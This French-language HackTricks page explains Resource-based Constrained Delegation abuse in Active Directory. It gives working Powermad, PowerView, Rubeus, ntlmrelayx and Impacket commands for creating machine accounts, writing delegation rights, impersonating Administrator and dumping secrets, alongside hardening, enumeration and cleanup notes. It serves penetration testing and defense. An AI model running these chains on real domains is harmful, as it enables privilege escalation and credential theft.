# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

La resource-based constrained delegation (RBCD) est similaire à la [constrained delegation](constrained-delegation.md), mais la direction de confiance est inversée. La constrained delegation traditionnelle enregistre les services auxquels un principal peut déléguer ; la RBCD enregistre, sur la **ressource cible**, les principaux autorisés à usurper l'identité d'utilisateurs auprès de celle-ci.<sup>[[12]](#references)</sup>

L'attribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ de l'objet cible contient un descripteur de sécurité identifiant les principaux autorisés à agir au nom d'autres identités sur cette ressource.

Une autre différence importante est qu'un principal disposant de **permissions d'écriture suffisantes sur un compte machine** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` et des droits similaires) peut être en mesure de définir _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. La configuration de la constrained delegation traditionnelle nécessite normalement un accès administratif plus privilégié.<sup>[[1]](#references)</sup>

Plus précisément, la modification des paramètres de constrained delegation classiques est normalement contrôlée par `SeEnableDelegationPrivilege` sur un contrôleur de domaine, un droit généralement détenu par des administrateurs hautement privilégiés. La RBCD déplace la décision vers le descripteur de sécurité de l'objet cible ; un accès en écriture à la propriété pertinente de l'objet ordinateur peut donc suffire sans ce droit utilisateur.<sup>[[1]](#references)[[2]](#references)</sup>

### New Concepts

Le flag **`TrustedToAuthForDelegation`** dans `userAccountControl` est souvent décrit comme un prérequis pour **S4U2Self**, mais cette description est incomplète.\
Un principal de service possédant un SPN peut demander S4U2Self sans ce flag. Avec `TrustedToAuthForDelegation`, le service ticket renvoyé est **forwardable** ; sans ce flag, le ticket est normalement **non-forwardable**.<sup>[[5]](#references)</sup>

La constrained delegation traditionnelle rejette un **TGS non-forwardable** lors de l'étape S4U2Proxy. La RBCD peut accepter ce ticket S4U2Self lorsque le descripteur de sécurité de la cible autorise le service demandeur.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Attack structure

> Si vous disposez de **privilèges équivalents à des permissions d'écriture** sur un **compte ordinateur**, vous pouvez être en mesure d'obtenir un accès privilégié à cette machine.

Supposons que l'attaquant dispose déjà de **privilèges équivalents à des permissions d'écriture sur l'objet ordinateur victime**.

1. L'attaquant **compromet** un compte possédant un **SPN** ou **en crée un** (« Service A »). Par défaut, un utilisateur de domaine authentifié peut créer jusqu'à 10 objets ordinateur, selon la valeur de **_MachineAccountQuota_** ; un objet ordinateur fournit automatiquement des SPN utilisables.
2. L'attaquant **abuse de son privilège WRITE** sur l'ordinateur victime (ServiceB) afin de configurer la resource-based constrained delegation et d'autoriser ServiceA à usurper l'identité de n'importe quel utilisateur auprès de cet ordinateur victime (ServiceB).
3. L'attaquant utilise Rubeus pour effectuer une **full S4U attack** (S4U2Self et S4U2Proxy) de Service A vers Service B pour un utilisateur **disposant d'un accès privilégié à Service B**.
1. S4U2Self (depuis le compte SPN compromis ou créé) : demander un **TGS représentant Administrator vers Service A** (non-forwardable).
2. S4U2Proxy : utiliser ce **TGS non-forwardable** pour demander un service ticket représentant **Administrator** vers l'**hôte victime**.
3. Le ticket non-forwardable peut tout de même fonctionner dans ce flux RBCD, car Service A est autorisé dans le descripteur de sécurité de la ressource cible.
4. L'attaquant peut effectuer un **pass-the-ticket** et **usurper l'identité** de l'utilisateur afin d'obtenir un **accès au ServiceB victime**.<sup>[[1]](#references)</sup>

Pour vérifier la valeur de _**MachineAccountQuota**_ du domaine, vous pouvez utiliser :
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attaque

### Création d’un objet ordinateur

Vous pouvez créer un objet ordinateur dans le domaine à l’aide de **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuration de la Resource-based Constrained Delegation

**Utilisation du module PowerShell Active Directory**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utiliser powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Effectuer une attaque S4U complète (Windows/Rubeus)

Tout d'abord, nous avons créé le nouvel objet Computer avec le mot de passe `123456`, nous avons donc besoin du hash de ce mot de passe :<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Cela affichera les hashes RC4 et AES de ce compte.\
L’attaque peut maintenant être effectuée :<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Vous pouvez générer davantage de tickets pour d’autres services en effectuant une seule demande à l’aide du paramètre `/altservice` de Rubeus :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Les utilisateurs peuvent être marqués **« Account is sensitive and cannot be delegated. »** Si cet indicateur est activé, le compte ne peut pas être usurpé via ce flux de délégation. BloodHound expose cette propriété lors de l’analyse.

### Outils Linux : RBCD de bout en bout avec Impacket (2024+)

Si vous opérez depuis Linux, vous pouvez effectuer la chaîne RBCD complète à l’aide des outils officiels d’Impacket :<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Remarques
- Si la signature LDAP/LDAPS est imposée, utilisez `impacket-rbcd -use-ldaps ...`.
- Préférez les clés AES ; de nombreux domaines modernes restreignent RC4. Impacket et Rubeus prennent tous deux en charge les flux utilisant uniquement AES.
- Impacket peut réécrire le `sname` (« AnySPN ») pour certains outils, mais obtenez le SPN correct chaque fois que possible (par exemple, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD inter-domaines et inter-forêts

Si le **principal de délégation** que vous contrôlez se trouve dans un **domaine différent** (ou même une **forêt différente**) de celui de l’**ordinateur ressource**, l’abus reste du **RBCD**, mais le flux de tickets n’est plus le flux habituel `S4U2Self -> S4U2Proxy` dans un domaine unique.

### RBCD inter-domaines : configurer le principal externe à l’aide de son SID

Lorsque vous définissez `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis un **domaine différent**, la machine ou l’utilisateur externe peut **ne pas être résolvable par son nom** dans le LDAP du domaine cible. Dans ce cas, configurez l’entrée de délégation à l’aide du **SID** du principal externe au lieu de son sAMAccountName/UPN.

Cela est particulièrement pertinent lors du relais de NTLM vers LDAP avec `ntlmrelayx.py` :<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes :
- `--sid` indique à `ntlmrelayx.py` de traiter `--escalate-user` comme un SID, ce qui est requis lorsque le compte délégant est externe au domaine cible.
- Même si l’outil affiche `User not found in LDAP`, l’écriture de la délégation peut quand même réussir, car le descripteur de sécurité stocke directement le SID externe.

### RBCD inter-domaines : séquence S4U cross-realm

Une fois que le principal externe se trouve dans `msDS-AllowedToActOnBehalfOfOtherIdentity`, le flux inter-domaines fonctionnel est le suivant :<sup>[[9]](#references)[[13]](#references)</sup>

1. Obtenir un **TGT** pour le principal délégant depuis son propre domaine.
2. Demander un **referral TGT** pour `krbtgt/<target-domain>`.
3. Demander un **cross-realm S4U2Self referral** pour l’utilisateur usurpé auprès du DC du domaine cible.
4. Demander le ticket **S4U2Self** réel pour cet utilisateur depuis le domaine délégant.
5. Effectuer **S4U2Proxy** dans le domaine délégant afin d’obtenir un ticket de referral pour le domaine cible.
6. Effectuer le **S4U2Proxy** final sur le DC du domaine cible afin d’obtenir le service ticket pour `cifs/host.target`, `host/host.target`, etc.

C’est pourquoi les outils Linux standards échouent souvent avec le RBCD inter-domaines :<sup>[[9]](#references)</sup>
- le **realm** de la requête peut devoir être différent du realm du TGT utilisé dans le `TGS-REQ`
- la chaîne nécessite des étapes **S4U2Proxy indépendantes**, et pas uniquement `S4U2Self` ou `S4U2Self` immédiatement suivi d’un unique `S4U2Proxy`

### RBCD inter-domaines depuis Linux

Synacktiv a publié une implémentation d’Impacket `getST.py` qui reproduit la séquence cross-realm depuis Linux en gérant explicitement les deux KDC :<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Opérationnellement, les nouveaux arguments sont :
- `-dc-ip` : DC du domaine **delegating**
- `-targetdomain` : domaine de l’ordinateur **resource**
- `-targetdc` : DC du domaine **resource**

### Limitations de RBCD cross-forest

RBCD cross-forest présente une limitation importante : **l’utilisateur impersonifié doit appartenir à la même forest que le principal delegating**. En d’autres termes, si votre machine account contrôlé se trouve dans `valhalla.local` et que la resource cible se trouve dans `asgard.local`, vous ne pouvez généralement **pas impersonifier des utilisateurs `asgard.local` arbitraires sur cette resource via RBCD**.<sup>[[9]](#references)</sup>

Cela reste exploitable lorsque :
- l’utilisateur de la **delegating forest** est **local admin** (ou possède autrement des privilèges) sur l’hôte resource de l’autre forest
- un trust autorise le chemin d’authentification requis et le SID foreign est accepté dans le security descriptor de l’ordinateur cible

### Particularités du protocole RBCD cross-forest

RBCD cross-forest ne consiste pas simplement en un « cross-domain avec un trust ». Le flux observé présente deux particularités que les outils courants ne prennent historiquement pas en compte :<sup>[[9]](#references)</sup>

1. Une requête **S4U2Proxy** supplémentaire qui définit **`PA-PAC-OPTIONS=branch-aware`**
2. Un service ticket final qui peut être renvoyé avec **RC4**, même lorsque d’autres etypes ont été demandés

Le flux pratique est le suivant :

1. Obtenir un TGT pour le principal delegating dans la forest A.
2. Demander un **S4U2Self** pour l’utilisateur impersonifié dans la forest A.
3. Demander un **S4U2Proxy** dans la forest A afin d’obtenir un referral TGT pour la forest B.
4. Envoyer un second **S4U2Proxy** dans la forest A **sans le ticket S4U2Self comme additional ticket**, mais avec `branch-aware` activé, afin d’obtenir un autre referral TGT pour la forest B.
5. Demander éventuellement un service ticket normal dans la forest B pour le principal delegating (ce ticket n’est pas requis pour l’abus final).
6. Utiliser les referral tickets des étapes 3 et 4 pour demander le ticket **S4U2Proxy** final dans la forest B pour l’utilisateur de la forest A impersonifié vers le SPN cible.

### RBCD cross-forest depuis Linux

La même branche Synacktiv d’Impacket ajoute un switch `-forest` pour cette logique :<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### RBCD récursif multi-domaines (3+ domaines)

Dans les **forêts multi-domaines**, **S4U2Self** et **S4U2Proxy** peuvent tous deux être **récursifs** au lieu de s'arrêter après une seule referral :

- **S4U2Self récursif** : le premier `S4U2Self` est envoyé au **domaine de l'utilisateur usurpé**, les hops intermédiaires entre domaines parent/enfant sont parcourus avec des referrals `TGS-REQ` normales pour `krbtgt/<REALM>`, puis le **`S4U2Self` final** est envoyé dans le **propre domaine du principal délégant**.
- Cela signifie que le fait de **détenir uniquement un TGT** pour un compte machine peut suffire à usurper l'identité d'un administrateur d'un autre domaine de la même forêt et à demander `cifs/host`, `host/host`, `wsman/host`, etc.
- Le **S4U2Proxy récursif** suit la chaîne de trust de la même manière : les hops intermédiaires réutilisent le ticket précédent comme TGT tout en demandant la referral `krbtgt/<REALM>` suivante, et seul le dernier hop renvoie le ticket de service final.<sup>[[10]](#references)</sup>

Un exemple pratique dans la même forêt est le suivant :
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD inter-domaines / inter-forêts sans SPN

Si le **principal délégant est un utilisateur sans SPN**, le dernier `S4U2Self` récursif échoue avec **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La solution consiste à **réessayer uniquement le dernier saut avec `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Résumé de la chaîne d’abus :

1. S’authentifier avec le **NT hash** afin d’orienter le KDC vers **RC4-HMAC (etype 23)**.
2. Demander d’abord **`-self -u2u`** et conserver ce ticket séparément de l’étape proxy ultérieure.
3. Extraire la clé de session du **TGT** avec `describeTicket.py`.
4. Remplacer le **NT hash** de l’utilisateur par cette **clé de session** avec `changepasswd.py -newhashes <session_key>`.
5. Réutiliser le ticket **`S4U2Self+U2U`** comme **`-additional-ticket`** lors d’une requête **`-proxy`** distincte.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Précautions opérationnelles :

- Lorsque le **premier saut de confiance est déjà une autre forêt**, privilégiez l’algorithme **branch-aware** (`getST.py ... -forest`) afin de correspondre au comportement natif de Windows. Si la forêt étrangère n’est atteinte que **plus tard** dans la chaîne, le flux récursif non branch-aware peut tout de même fonctionner.<sup>[[9]](#references)</sup>
- Sur les DC **Windows Server 2022/2025** récents, le RC4 forcé peut échouer avec **`KDC_ERR_ETYPE_NOSUPP`** en raison de la dépréciation de RC4 ; cela peut rendre le **RBCD sans SPN** impossible, même si le RBCD classique basé sur un SPN fonctionne toujours avec AES.<sup>[[15]](#references)</sup>
- Exécutez **`S4U2Self+U2U` avant de modifier le hash/mot de passe de l’utilisateur** : `SamrChangePasswordUser` ne recalcule **pas** les clés AES Kerberos du compte ; effectuer la modification du mot de passe en premier peut donc interrompre les demandes de tickets ultérieures.<sup>[[14]](#references)</sup>
- Le compte usurpé doit toujours être **délégable** : **Protected Users** et les comptes avec **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloquent la chaîne.

## Notes de détection / hardening

- Les chemins RBCD entre domaines/forêts sont encore généralement créés par le biais d’un **abuse d’ACL** ou d’un **relay-to-LDAP**. Appliquez la **signature LDAP** et le **channel binding LDAP** sur les DC afin de bloquer les chemins de configuration courants.
- Auditez les personnes pouvant écrire `msDS-AllowedToActOnBehalfOfOtherIdentity` sur les objets ordinateur et résolvez les SID stockés, y compris les **foreign security principals**.
- Dans les environnements comportant de nombreuses relations de confiance, examinez **Selective Authentication**, le **SID filtering** et déterminez si des utilisateurs provenant d’une forêt étrangère disposent de droits d’**administrateur local** sur les hôtes de ressources.

### Accès

La dernière ligne de commande exécutera la **complete S4U attack** et injectera le TGS d’Administrator vers l’hôte victime en **mémoire**.\
Dans cet exemple, un TGS a été demandé pour le service **CIFS** d’Administrator ; vous pourrez donc accéder à **C$** :
```bash
ls \\victim.domain.local\C$
```
### Abuser de différents tickets de service

Découvrez les [**tickets de service disponibles ici**](silver-ticket.md#available-services).

## Énumération, audit et nettoyage

### Énumérer les ordinateurs avec RBCD configuré

PowerShell (décodage du SD pour résoudre les SID) :
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (lire ou flush avec une seule commande) :
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Nettoyage / réinitialisation de RBCD

- PowerShell (effacer l’attribut) :
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Erreurs Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`** : Cela signifie que Kerberos est configuré pour ne pas utiliser DES ou RC4 et que vous fournissez uniquement le hash RC4. Fournissez à Rubeus au moins le hash AES256 (ou fournissez-lui simplement les hash RC4, AES128 et AES256). Exemple : `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** pendant `-self` pour un utilisateur normal : le principal délégant n'a probablement **aucun SPN**. Réessayez le **dernier hop** avec **`S4U2Self+U2U`** au lieu d'un **`S4U2Self`** classique.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** pendant un **RBCD sans SPN** : les DC récents peuvent rejeter le chemin **RC4-HMAC** forcé requis par l'astuce **`S4U2Self+U2U` + substitution de clé de session**. Essayez plutôt un chemin RBCD classique **adossé à un SPN**, avec AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`** : Cela signifie que l'heure de l'ordinateur actuel est différente de celle du DC et que Kerberos ne fonctionne pas correctement.
- **`preauth_failed`** : Cela signifie que le nom d'utilisateur et les hash fournis ne permettent pas de se connecter. Vous avez peut-être oublié de mettre le caractère « `$` » dans le nom d'utilisateur lors de la génération des hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
- **`KDC_ERR_BADOPTION`** : Cela peut signifier :
- L'utilisateur que vous essayez d'usurper ne peut pas accéder au service souhaité (parce que vous ne pouvez pas l'usurper ou parce qu'il ne dispose pas de privilèges suffisants).
- Le service demandé n'existe pas (si vous demandez un ticket pour winrm alors que winrm ne fonctionne pas).
- Le fakecomputer créé a perdu ses privilèges sur le serveur vulnérable et vous devez les lui rendre.
- Vous abusez de KCD classique ; rappelez-vous que RBCD fonctionne avec des tickets S4U2Self non forwardable, tandis que KCD exige des tickets forwardable.

## Notes, relays et alternatives

- Vous pouvez également écrire le SD RBCD via Active Directory Web Services (ADWS) si LDAP est filtré. Voir :


{{#ref}}
adws-enumeration.md
{{#endref}}

- Les chaînes de relay Kerberos se terminent fréquemment par un RBCD afin d'obtenir SYSTEM local en une seule étape. Voir des exemples pratiques de bout en bout :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si la signature LDAP et la channel binding sont **désactivées** et que vous pouvez créer un compte machine, des outils comme **KrbRelayUp** peuvent relayer une authentification Kerberos forcée vers LDAP, définir `msDS-AllowedToActOnBehalfOfOtherIdentity` pour votre compte machine sur l'objet ordinateur cible, puis usurper immédiatement **Administrator** via S4U depuis l'extérieur de l'hôte.<sup>[[8]](#references)</sup>

## References

- [1] [Abuser de la délégation contrainte basée sur les ressources pour attaquer Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Un autre mot sur la délégation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Délégation contrainte basée sur les ressources Kerberos : prise de contrôle d'un objet ordinateur](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Abus de la délégation contrainte basée sur les ressources](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity a tué le domaine : une vue d'ensemble offensive de Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (officiel)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Cheatsheet Linux rapide avec la syntaxe récente](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (signature LDAP désactivée → relay Kerberos vers RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploration du RBCD inter-domaines et inter-forêts](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploration du RBCD inter-domaines et inter-forêts : deuxième partie](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Branche Impacket de Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Vue d'ensemble de la délégation contrainte Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Spécifications ouvertes Microsoft - S4U2Self inter-domaines](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Spécifications ouvertes Microsoft - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Détecter et corriger l'utilisation de RC4 dans Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Spécifications ouvertes Microsoft – Détails de S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
